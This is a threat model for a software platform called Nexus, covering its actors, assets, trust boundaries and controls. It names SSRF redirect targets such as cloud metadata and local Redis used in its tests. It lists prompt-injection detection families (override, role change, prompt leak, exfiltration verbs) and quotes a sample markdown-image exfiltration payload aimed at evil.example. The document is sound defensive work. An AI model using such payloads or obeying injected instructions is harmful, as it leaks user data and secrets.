<!-- SPDX-License-Identifier: Apache-2.0 -->

# Nexus Threat Model

**Version:** 2.0
**Last updated:** 2026-10-14
**Status:** Authoritative — update when a trust boundary, an executing surface or an
unauthenticated route changes.

The engineering detail behind this document (findings, fixes, tests) is in
`docs/internal/security-findings.md`; the boundary and flow descriptions are in
`docs/internal/architecture.md`.

---

## 1. Scope

- `apps/api` — Fastify API (REST, SSE, MCP, OpenAI-compatible `/v1`), also serving the UI on
  single-origin deployments
- `apps/worker` — BullMQ consumers (coding agent, browser tasks, feeds)
- `apps/desktop` — Electron shell running the API locally against embedded Postgres
- `apps/ui`, `apps/cli`
- `services/ingest` — Python scrapers
- Data stores: Postgres (Neon / PGlite), Redis or Upstash (optional), the shared KV

Out of scope: model providers' own security, the hosting platform, the user's own machine when
running the desktop app (the owner is the operator there).

## 2. Actors

| Actor                     | Can                                                                                               |
| ------------------------- | ------------------------------------------------------------------------------------------------- |
| Anonymous internet user   | Register (cloud), reach public routes (listed in `apps/api/tests/security/public-routes.test.ts`) |
| Registered member         | Everything a member route allows; run sandboxed code; ask for approvals                           |
| Workspace member / viewer | Read (and for members, comment and file tasks in) a shared company                                |
| Admin / owner             | Admin routes, approve host shells, run the security check                                         |
| Holder of the master key  | Admin-level API access without a user identity                                                    |
| Content author            | Anyone whose text reaches a model: web pages, KB documents, webhooks                              |
| Third-party platform      | Slack, Teams, Telegram, identity providers calling webhooks/callbacks                             |

## 3. Assets

| ID  | Asset                                              | Why it matters                                        |
| --- | -------------------------------------------------- | ----------------------------------------------------- |
| A1  | Server secrets (JWT key, API key, encryption keys) | Any one of them forges sessions or decrypts user data |
| A2  | Users' provider keys                               | Spend and data in third-party accounts                |
| A3  | Accounts and sessions                              | Everything a user owns                                |
| A4  | User content (threads, memory, KB, orgs)           | Confidentiality between accounts                      |
| A5  | The host (API, worker, desktop machine)            | Code execution there reaches A1–A4                    |
| A6  | Audit log chain                                    | Evidence of who did what                              |
| A7  | Operator spend (server-side provider keys)         | Public endpoints spend it                             |

## 4. Trust boundaries and controls

### 4.1 Internet → API

| Threat                            | Control                                                                                                                                                                                                                                                                                |
| --------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| A route accidentally public       | `/api/v1` has no scope-wide auth; the route census test fails on any unlisted public route                                                                                                                                                                                             |
| Session theft / replay            | 15-minute access tokens bound to a session (`sid`); revocation in the security KV checked by both verifiers; refresh rotation with replay detection                                                                                                                                    |
| Password guessing                 | Per-address exponential lockout plus an account-wide ceiling in the security KV                                                                                                                                                                                                        |
| MFA bypass                        | TOTP checked inside login; each code accepted once; hashed single-use recovery codes                                                                                                                                                                                                   |
| Account takeover through SSO      | Verified email (Google, OIDC, SAML) or immutable id (GitHub, Slack team+user); first SSO sign-in strips an unverified account's other credentials; state bound to the browser by cookie                                                                                                |
| Spend abuse on public completions | Per-client (IPv6 /64) and global ceilings keyed on `request.ip`                                                                                                                                                                                                                        |
| Forged webhooks                   | Slack HMAC over raw bytes, Bot Framework JWT for Teams, secret token for Telegram; each refuses when unconfigured; replies only to the verified service URL                                                                                                                            |
| Session thief moving the account  | Changing the sign-in email needs the current password; security notices are emailed, an email change to the old address                                                                                                                                                                |
| Endless hammering of one route    | Fixed-window limits per route family, bucketed on the strongest identity (user, else API key hash, else address); `Retry-After` counts the window down rather than repeating it, and an idle-then-busy caller recovers exactly at the boundary (`tests/lib/rate-limit-window.test.ts`) |

### 4.2 User or model input → execution

| Surface                                          | Isolation                                                                                                                                |
| ------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------- |
| JavaScript sandbox, programmatic tool calling    | Child Node, permission model, empty env, no network, memory cap, deadline                                                                |
| Python sandbox, code agent                       | Pyodide in a child Node, permission model reading only Pyodide, empty env, no network, 256 MB heap, 512 MB WASM, deadline, fresh per run |
| Host PTY, coding agent, skills, org CLI runtimes | Exec policy; on a shared server a host shell is admin-approved; PTY sessions owner-scoped; org CLIs get an allow-listed environment      |
| Workflow transforms                              | Desktop only                                                                                                                             |

Every executing surface goes through `@nexus/exec-policy` (`NEXUS_EXEC_MODE`, allow/deny rules,
single-use action-bound approvals).

### 4.3 API → outside world

Requests to a URL a user, model or document chose go through the pinned fetch: resolve, refuse
private, loopback, link-local, CGNAT, multicast, reserved and IPv6 forms that embed them
(mapped, NAT64, 6to4, IPv4-compatible), then pin the socket to the checked address; redirects are
re-checked. The stealth browser routes every page request through it.

The refusal is tested as the attack rather than as a function: `apps/api/tests/security/ssrf-guard.test.ts`
walks a 302 to `169.254.169.254` and to `127.0.0.1:6379` and asserts the second hop was never
fetched, caps a public redirect chain at five hops, and asserts that every route which fetches a
caller-supplied URL (`kb`, `context`, `mcp-openapi`, `scraping-mcp`, `browser-agent`, `reactions`,
`provider-keys`) goes through the guard — a correct guard that one route forgets is the bug that
file exists to catch, so it also fails on any `redirect: "follow"` in the API's source.

### 4.4 Outside text → models

Web pages, KB passages, webhook payloads and tool output are screened (`screenUntrusted`) and
labelled untrusted in prompts. Prompt injection is mitigated, not prevented: whatever a model
tries to execute still meets §4.2.

Eleven rule families now cut instruction-like spans: override, role, prompt leak, chat-template
delimiters, «forget everything above», persona assignment, tool calls, JSON `tool_calls`,
secret requests, exfiltration verbs aimed at a URL, and remote markdown images. A model-backed
classifier catches what the patterns miss when `NEXUS_INJECTION_CLASSIFIER` is set.

`apps/api/tests/security/prompt-injection.test.ts` composes twenty hostile documents through the
same function the council uses (`sourcesPrompt`) and asserts, per document, that the payload is
gone from what the model would read while the untrusted-data note is present, that the excerpt
still contributes its harmless text, and that composing the prompt makes **no outbound request**
— a document carrying `![x](https://evil.example/steal?…)` is an exfiltration attempt only if
something dereferences it. Documents stay raw at rest and are screened at prompt time, so the
file asserts that order explicitly.

### 4.5 API ↔ data stores

| Threat                      | Control                                                                                                                                                                                                                                         |
| --------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Job injection through Redis | Redis is a trust boundary: loopback in development; the security check fails a remote `REDIS_URL` without a password                                                                                                                            |
| Plaintext secrets at rest   | AES-256-GCM for provider keys, the secret store and TOTP secrets (`NEXUS_MFA_KEY`)                                                                                                                                                              |
| Audit log tampering         | HMAC chain with `NEXUS_AUDIT_KEY`; the security check fails when it falls back to the published default                                                                                                                                         |
| Database in clear text      | The security check warns on a remote `DATABASE_URL` without `sslmode`                                                                                                                                                                           |
| Cross-account read by id    | Every collection with item routes gets a fixture or a written reason to skip in `tests/security/cross-account.test.ts`; a new collection fails the census until it has one. Sandbox results are covered by `tests/routes/sandbox-owner.test.ts` |

### 4.6 Desktop shell

Context isolation, sandboxed renderer, no Node integration; navigation away from the renderer is
cancelled and only `http`, `https` and `mailto` links reach the operating system; the session is
sealed with the OS keychain.

## 5. Operator posture

`GET /api/v1/admin/security/posture`, `nexus security check` and the admin System page list every
setting that weakens the controls above, with the change that closes it. Production start-up logs
the failing ones.

## 6. Residual risks

| Risk                                               | Why accepted                                                                |
| -------------------------------------------------- | --------------------------------------------------------------------------- |
| Mail depends on the operator's Resend account      | Without it reset and verification are unavailable; the security check warns |
| Prompt injection steering an agent                 | Inherent to LLMs; execution and spend are bounded by §4.2 and budgets       |
| Per-process rate limits without Redis/Upstash      | Security state still persists in Postgres; the security check warns         |
| `katex` (low) and `sprintf-js` (no fix) advisories | UI-only / unpatched upstream                                                |
| Registration reveals existing addresses            | Rate-limited; usual sign-up trade-off                                       |
